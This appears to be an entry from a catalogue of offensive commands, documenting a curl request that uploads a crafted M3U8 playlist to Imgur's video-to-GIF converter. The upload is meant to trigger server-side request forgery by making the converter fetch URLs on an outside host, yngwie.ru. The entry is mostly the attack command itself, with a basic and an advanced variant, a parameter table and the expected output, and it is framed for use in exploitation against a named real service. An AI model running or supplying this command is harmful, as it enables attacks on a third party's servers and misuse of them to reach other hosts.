---
data: >-
  curl -X POST https://imgur.com/vidgif/upload -F "file=@crafted.m3u8" -d
  "source=http://yngwie.ru/1.mp4&url=http://yngwie.ru/1.mp4&start=0.08&stop=5.12"
tags:
  - ssrf
  - upload
type: command
output: HTTP/1.1 200 OK with upload confirmation
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:48.224Z'
id: b8744bef-0c04-4dce-b5fe-246206af13ed
verified: false
validated: true
submitted: true
---
# upload-m3u8-for-ssrf

## Command

```bash
curl -X POST https://imgur.com/vidgif/upload -F "file=@crafted.m3u8" -d "source=http://yngwie.ru/1.mp4&url=http://yngwie.ru/1.mp4&start=0.08&stop=5.12"
```

## Description

Uploads a crafted M3U8 playlist to Imgur's video to GIF converter, triggering SSRF by causing Lavf to fetch external URLs. Use when exploiting unvalidated playlist processing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-F "file=@crafted.m3u8"` | Path to the M3U8 file | Yes |
| `source` | Primary video URL | Yes |
| `url` | Redundant URL parameter | Yes |
| `start` | Start time in seconds | Yes |
| `stop` | Stop time in seconds | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://imgur.com/vidgif/upload -F "file=@playlist.m3u8" -d "source=http://example.com/video.mp4&url=http://example.com/video.mp4&start=0&stop=10"
```

### Advanced Usage

```bash
curl -X POST https://imgur.com/vidgif/upload -F "file=@playlist.m3u8" -d "source=http://yngwie.ru/1.mp4&url=http://yngwie.ru/1.mp4&start=0.08&stop=5.12" -v
```

## Expected Output

Server responds with 200 OK and processes the file, initiating background fetches visible in external logs.

## Related

- [[Related Procedure: Trigger-SSRF-with-M3U8-Upload]]
